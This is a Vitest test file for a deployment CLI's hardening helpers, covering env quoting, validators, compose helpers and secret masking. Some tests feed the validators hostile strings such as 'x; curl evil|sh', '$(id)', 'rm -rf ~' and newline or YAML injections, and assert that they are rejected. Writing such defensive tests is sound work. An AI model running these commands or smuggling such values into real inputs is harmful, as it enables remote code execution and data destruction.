import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

// Pure helpers added for the 1.6.0 hardening pass. Docker is never touched:
// execFileSync is stubbed so anything reaching the daemon fails loudly.
vi.mock('node:child_process', async () => {
  const actual = await vi.importActual<typeof import('node:child_process')>('node:child_process')
  return {
    ...actual,
    execFileSync: vi.fn(() => { throw new Error('docker not available in tests') }),
  }
})

import { writeFileAtomic } from '../src/utils/fs-atomic.js'
import { readEnvVar, setEnvVar, unquoteEnvValue } from '../src/utils/env-file.js'
import { quoteEnvValue } from '../src/utils/env-quote.js'
import { hasComposeService, publicUrl, stackLayout, usesExternalDb, usesS3Content } from '../src/services/stack.js'
import { isValidDeploymentId, readConfig, findInstallDir } from '../src/services/config-store.js'
import { validateEmail, validateInstallName, validatePostgresUrl, validateRedisUrl, validateSlug, validateDomain } from '../src/utils/validators.js'
import { setMemLimit, parseMemLimit } from '../src/commands/scale.js'
import { parseDeploymentLine } from '../src/commands/deployments.js'
import { isSecret, maskValue, serializeEnv } from '../src/commands/env.js'
import { withSecretsFromEnv } from '../src/commands/setup.js'
import { updateCheckEnabled, updateNotice } from '../src/services/version-check.js'
import { IMAGE_TAG_RE } from '../src/commands/update-ee.js'
import { containerBelongsTo } from '../src/services/docker.js'
import { generateDockerCompose } from '../src/templates/docker-compose.js'
import { generateEeDockerCompose } from '../src/templates/ee.js'
import { generateEnvFile } from '../src/templates/env.js'
import type { SetupConfig } from '../src/types.js'

let tmp: string
beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lh-harden-')) })
afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }) })

function baseConfig(over: Partial<SetupConfig> = {}): SetupConfig {
  return {
    deploymentId: 'ab12cd34', installDir: tmp, channel: 'stable', domain: 'learn.example.org',
    useHttps: false, httpPort: 80, autoSsl: false, useExternalDb: false, dbPassword: 'pw',
    useAiDatabase: false, useExternalRedis: false, orgName: 'Org', orgSlug: 'org',
    adminEmail: 'a@learn.dev', adminPassword: 'p@ss$word#1', aiEnabled: false, emailEnabled: false,
    s3Enabled: false, googleOAuthEnabled: false, ...over,
  }
}

describe('writeFileAtomic', () => {
  it('replaces contents and keeps an existing file mode', () => {
    const f = path.join(tmp, '.env')
    fs.writeFileSync(f, 'old', { mode: 0o600 })
    writeFileAtomic(f, 'new')
    expect(fs.readFileSync(f, 'utf-8')).toBe('new')
    expect(fs.statSync(f).mode & 0o777).toBe(0o600)
    expect(fs.readdirSync(tmp)).toEqual(['.env']) // no temp file left behind
  })

  it('applies an explicit mode to a new file', () => {
    const f = path.join(tmp, 'secret')
    writeFileAtomic(f, 'x', 0o600)
    expect(fs.statSync(f).mode & 0o777).toBe(0o600)
  })
})

describe('env-file read/write round-trip', () => {
  it.each([
    'plain',
    'with space',
    'dollar$VAR',
    "it's",
    'hash#tag',
    'back\\slash"quote',
  ])('setEnvVar then readEnvVar returns %j unchanged', (value) => {
    fs.writeFileSync(path.join(tmp, '.env'), 'A=1\nKEY=old\n', { mode: 0o600 })
    setEnvVar(tmp, 'KEY', value)
    expect(readEnvVar(tmp, 'KEY')).toBe(value)
    expect(readEnvVar(tmp, 'A')).toBe('1')
    expect(fs.statSync(path.join(tmp, '.env')).mode & 0o777).toBe(0o600)
  })

  it('refuses multi-line values (they would inject extra .env entries)', () => {
    fs.writeFileSync(path.join(tmp, '.env'), 'KEY=old\n')
    expect(() => setEnvVar(tmp, 'KEY', 'prod\nEVIL=1')).toThrow(/single line/)
  })

  it('unquoteEnvValue inverts quoteEnvValue', () => {
    for (const v of ['a', "a'b", 'a b', 'a"b\\c', '$x']) expect(unquoteEnvValue(quoteEnvValue(v))).toBe(v)
  })
})

describe('stack helpers', () => {
  it('detects services and an external database from the compose file', () => {
    fs.writeFileSync(path.join(tmp, 'docker-compose.yml'), generateDockerCompose(baseConfig()))
    expect(hasComposeService(tmp, 'db')).toBe(true)
    expect(hasComposeService(tmp, 'learnhouse-app')).toBe(true)
    expect(usesExternalDb(tmp)).toBe(false)

    fs.writeFileSync(path.join(tmp, 'docker-compose.yml'), generateDockerCompose(baseConfig({
      useExternalDb: true, externalDbConnectionString: 'postgresql://u:p@h/db',
    })))
    expect(usesExternalDb(tmp)).toBe(true)
  })

  it('a Community .env always carries the SQL connection string, so it does not imply an external DB', () => {
    fs.writeFileSync(path.join(tmp, 'docker-compose.yml'), generateDockerCompose(baseConfig()))
    fs.writeFileSync(path.join(tmp, '.env'), generateEnvFile(baseConfig()))
    expect(readEnvVar(tmp, 'LEARNHOUSE_SQL_CONNECTION_STRING')).toContain('@db:5432')
    expect(usesExternalDb(tmp)).toBe(false)
  })

  it('Enterprise compose: db present unless external', () => {
    fs.writeFileSync(path.join(tmp, 'docker-compose.yml'), generateEeDockerCompose(baseConfig({ edition: 'enterprise' })))
    expect(hasComposeService(tmp, 'api')).toBe(true)
    expect(hasComposeService(tmp, 'db')).toBe(true)
  })

  it('usesS3Content reads the delivery type (quoted or not)', () => {
    fs.writeFileSync(path.join(tmp, '.env'), "LEARNHOUSE_CONTENT_DELIVERY_TYPE='s3api'\n")
    expect(usesS3Content(tmp)).toBe(true)
    fs.writeFileSync(path.join(tmp, '.env'), 'LEARNHOUSE_CONTENT_DELIVERY_TYPE=filesystem\n')
    expect(usesS3Content(tmp)).toBe(false)
  })

  it('stackLayout differs per edition', () => {
    expect(stackLayout({ edition: 'community' }).appService).toBe('learnhouse-app')
    expect(stackLayout({ edition: 'enterprise' }).appService).toBe('api')
    expect(stackLayout({ edition: 'enterprise' }).contentPath).toBe('/app/content')
  })

  it.each([
    [{ useHttps: false, autoSsl: false, httpPort: 80 }, 'http://d.io'],
    [{ useHttps: false, autoSsl: false, httpPort: 8080 }, 'http://d.io:8080'],
    // manual HTTPS: TLS ends at the user's proxy on 443; the local port never shows
    [{ useHttps: true, autoSsl: false, httpPort: 80 }, 'https://d.io'],
    [{ useHttps: true, autoSsl: false, httpPort: 8080 }, 'https://d.io'],
    [{ useHttps: true, autoSsl: true, httpPort: 443 }, 'https://d.io'],
    [{ useHttps: true, autoSsl: true, httpPort: 8443 }, 'https://d.io:8443'],
  ])('publicUrl(%j) = %s', (cfg, url) => {
    expect(publicUrl({ domain: 'd.io', ...cfg })).toBe(url)
  })

  it('manual HTTPS on port 80 no longer produces https://domain:80 in .env', () => {
    const env = generateEnvFile(baseConfig({ useHttps: true, autoSsl: false, httpPort: 80 }))
    expect(env).toContain('NEXTAUTH_URL=https://learn.example.org\n')
    expect(env).not.toContain(':80')
  })
})

describe('generateEnvFile quoting', () => {
  it('quotes every user-supplied value', () => {
    const env = generateEnvFile(baseConfig({
      emailEnabled: true, emailProvider: 'smtp', smtpHost: 'smtp.x.io', smtpUsername: 'u ser',
      smtpPassword: 'pa$$#word', aiEnabled: true, geminiApiKey: 'k$y',
      s3Enabled: true, s3BucketName: 'b', s3EndpointUrl: 'https://s3.x.io/?a=1#b',
      useExternalRedis: true, externalRedisConnectionString: 'redis://:p$w@h:6379',
    }))
    expect(env).toContain("LEARNHOUSE_SMTP_PASSWORD='pa$$#word'")
    expect(env).toContain("LEARNHOUSE_SMTP_USERNAME='u ser'")
    expect(env).toContain("LEARNHOUSE_GEMINI_API_KEY='k$y'")
    expect(env).toContain("LEARNHOUSE_S3_API_ENDPOINT_URL='https://s3.x.io/?a=1#b'")
    expect(env).toContain("LEARNHOUSE_REDIS_URL='redis://:p$w@h:6379'")
  })

  it('reuses existing secrets when given', () => {
    const env = generateEnvFile(baseConfig(), { nextAuthSecret: 'N', jwtSecret: 'J', collabInternalKey: 'C' })
    expect(env).toContain('NEXTAUTH_SECRET=N\n')
    expect(env).toContain('LEARNHOUSE_AUTH_JWT_SECRET_KEY=J\n')
    expect(env).toContain('COLLAB_INTERNAL_KEY=C\n')
  })
})

describe('config-store', () => {
  it('rejects a deploymentId that could reach a shell or compose file', () => {
    expect(isValidDeploymentId('ab12cd34')).toBe(true)
    expect(isValidDeploymentId('dep1')).toBe(true)
    for (const bad of ['x; curl evil|sh', '$(id)', '', 'a b', '../x', 'A'.repeat(41)]) {
      expect(isValidDeploymentId(bad)).toBe(false)
    }
    fs.writeFileSync(path.join(tmp, 'learnhouse.config.json'), JSON.stringify({ deploymentId: 'x; rm -rf ~', installDir: tmp }))
    const err = vi.spyOn(console, 'error').mockImplementation(() => {})
    expect(readConfig(tmp)).toBeNull()
    err.mockRestore()
  })

  it('readConfig reports where the file actually is, not the path recorded at setup', () => {
    fs.writeFileSync(path.join(tmp, 'learnhouse.config.json'), JSON.stringify({ deploymentId: 'ab12cd34', installDir: '/somewhere/else' }))
    expect(readConfig(tmp)!.installDir).toBe(path.resolve(tmp))
  })

  it('findInstallDir honors LEARNHOUSE_DIR, then the current directory', () => {
    const orig = { dir: process.env.LEARNHOUSE_DIR, cwd: process.cwd(), home: process.env.HOME }
    try {
      process.env.HOME = tmp // no ~/.learnhouse here
      process.env.LEARNHOUSE_DIR = '/opt/lh'
      expect(findInstallDir()).toBe(path.resolve('/opt/lh'))
      delete process.env.LEARNHOUSE_DIR
      const inst = path.join(tmp, 'inst')
      fs.mkdirSync(inst)
      fs.writeFileSync(path.join(inst, 'learnhouse.config.json'), JSON.stringify({ deploymentId: 'ab12cd34' }))
      fs.writeFileSync(path.join(inst, '.env'), '')
      process.chdir(inst)
      expect(fs.realpathSync(findInstallDir())).toBe(fs.realpathSync(inst))
    } finally {
      process.chdir(orig.cwd)
      if (orig.dir === undefined) delete process.env.LEARNHOUSE_DIR; else process.env.LEARNHOUSE_DIR = orig.dir
      process.env.HOME = orig.home
    }
  })
})

describe('validators', () => {
  it.each(['default', 'prod-1', 'my_site', 'a.b'])('install name %s is valid', (n) => {
    expect(validateInstallName(n)).toBeUndefined()
  })
  it.each(['', '.', '..', '../x', 'a/b', 'a\\b', '$(id)', '-x', 'a b', 'x'.repeat(65)])('install name %j is rejected', (n) => {
    expect(validateInstallName(n)).toBeDefined()
  })
  it('slug is capped at one DNS label', () => {
    expect(validateSlug('a'.repeat(63))).toBeUndefined()
    expect(validateSlug('a'.repeat(64))).toBeDefined()
  })
  it('email rejects empty and hyphen-edged domain labels', () => {
    expect(validateEmail('a@b..com')).toBeDefined()
    expect(validateEmail('a@-b.com')).toBeDefined()
    expect(validateEmail('admin@learn.acme.com')).toBeUndefined()
  })
  it('domain rejects labels over 63 characters', () => {
    expect(validateDomain(`${'a'.repeat(64)}.com`)).toBeDefined()
  })
  it('connection URL schemes', () => {
    expect(validatePostgresUrl('postgresql://u@h/db')).toBeUndefined()
    expect(validatePostgresUrl('postgres://u@h/db')).toBeUndefined()
    expect(validatePostgresUrl('mysql://u@h/db')).toBeDefined()
    expect(validateRedisUrl('rediss://h:6379')).toBeUndefined()
    expect(validateRedisUrl('http://h')).toBeDefined()
  })
  it('image tags cannot carry YAML or .env injection', () => {
    for (const ok of ['1.6.0', 'v1.6.0', 'prod', '1.6.0-rc.1', 'latest']) expect(IMAGE_TAG_RE.test(ok)).toBe(true)
    for (const bad of ['1.5.0\n    privileged: true', '1.5.0\t#', 'a b', '', '../x', '-x']) expect(IMAGE_TAG_RE.test(bad)).toBe(false)
  })
})

describe('scale: setMemLimit on Enterprise services (no container_name)', () => {
  it('inserts under the service header and parseMemLimit reads it back', () => {
    const compose = generateEeDockerCompose(baseConfig({ edition: 'enterprise' }))
    let c = setMemLimit(compose, 'api', '2g')
    c = setMemLimit(c, 'web', '1g')
    expect(c).not.toBe(compose)
    const f = path.join(tmp, 'docker-compose.yml')
    fs.writeFileSync(f, c)
    const limits = parseMemLimit(f)
    expect(limits.get('api')).toBe('2g')
    expect(limits.get('web')).toBe('1g')
    expect(limits.has('collab')).toBe(false)
  })

  it('does not touch top-level sections that share a service name', () => {
    const compose = generateDockerCompose(baseConfig())
    const c = setMemLimit(compose, 'redis', '256m')
    expect(c.split('mem_limit').length - 1).toBe(1)
  })
})

describe('deployments: both naming schemes', () => {
  it.each([
    ['learnhouse-app-ab12cd34\tUp 2 hours\timg\tlearnhouse-ab12cd34\tlearnhouse-app', 'ab12cd34', 'learnhouse-app'],
    ['learnhouse-ab12cd34-api-1\tUp\timg\tlearnhouse-ab12cd34\tapi', 'ab12cd34', 'api'],
    ['learnhouse-ab12cd34-db-1\tExited\timg\t\t', 'ab12cd34', 'db'],
    ['learnhouse-redis-ab12cd34\tUp\timg\t\t', 'ab12cd34', 'learnhouse-redis'],
  ])('%s', (line, id, service) => {
    const parsed = parseDeploymentLine(line)!
    expect(parsed.id).toBe(id)
    expect(parsed.container.service).toBe(service)
  })

  it('containerBelongsTo matches Community and Enterprise names only for its own id', () => {
    expect(containerBelongsTo('learnhouse-db-ab12cd34', 'ab12cd34')).toBe(true)
    expect(containerBelongsTo('learnhouse-ab12cd34-db-1', 'ab12cd34')).toBe(true)
    expect(containerBelongsTo('learnhouse-db-ffff0000', 'ab12cd34')).toBe(false)
  })
})

describe('env editor helpers', () => {
  it('masks secrets completely and treats license keys and tokens as secrets', () => {
    expect(maskValue('POSTGRES_PASSWORD', 'abcdefgh')).toBe('********')
    expect(isSecret('LEARNHOUSE_LICENSE_KEY')).toBe(true)
    expect(isSecret('CLOUDFLARE_API_TOKEN')).toBe(true)
    expect(isSecret('COLLAB_INTERNAL_KEY')).toBe(true)
    expect(maskValue('HTTP_PORT', '80')).toBe('80')
  })

  it('serializeEnv quotes changed values and leaves the rest byte-for-byte', () => {
    const original = "# c\nA='keep me'\nB=old\n"
    const out = serializeEnv(original, new Map([['A', 'keep me'], ['B', 'new $val'], ['C', 'x']]), new Set(['B', 'C']))
    expect(out).toBe("# c\nA='keep me'\nB='new $val'\n\nC=x")
  })
})

describe('setup: secrets from the environment', () => {
  it('fills missing secret flags from LEARNHOUSE_* env vars; flags win', () => {
    const env = { LEARNHOUSE_ADMIN_PASSWORD: 'fromenv1', LEARNHOUSE_LICENSE_KEY: 'lic', LEARNHOUSE_EXTERNAL_DB: 'postgresql://x' }
    expect(withSecretsFromEnv({}, env)).toMatchObject({ adminPassword: 'fromenv1', license: 'lic', externalDb: 'postgresql://x' })
    expect(withSecretsFromEnv({ adminPassword: 'flag' }, env).adminPassword).toBe('flag')
  })
})

describe('update check', () => {
  it('is off in CI, when opted out, or without a terminal', () => {
    expect(updateCheckEnabled({}, true)).toBe(true)
    expect(updateCheckEnabled({ CI: 'true' }, true)).toBe(false)
    expect(updateCheckEnabled({ LEARNHOUSE_NO_UPDATE_CHECK: '1' }, true)).toBe(false)
    expect(updateCheckEnabled({}, false)).toBe(false)
  })

  it('only notices a newer version', () => {
    expect(updateNotice('0.0.1')).toBeNull()
    expect(updateNotice(null)).toBeNull()
    expect(updateNotice('999.0.0')).toContain('Update available')
  })
})
